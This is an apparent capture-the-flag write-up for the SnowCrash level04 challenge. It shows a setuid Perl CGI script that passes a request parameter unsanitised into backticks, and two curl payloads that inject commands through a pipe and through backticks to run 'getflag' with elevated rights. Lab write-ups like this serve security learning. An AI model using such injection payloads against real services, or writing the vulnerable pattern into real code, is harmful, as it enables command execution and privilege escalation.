4 -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
setuid / setgid again here

level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

using the &y which is a user input we can send whatever we want inside

curl "http://localhost:4747?x=|getflag"
and 
curl "http://localhost:4747?x=\`getflag\`"

we can actually execute getflag from the script

pipe method works because it's within the perl script that executes with elevated permissions
(tanks to setuid)

the second method uses backticks "`" that executes command, again with elevated permissions
as it still is within the perl script
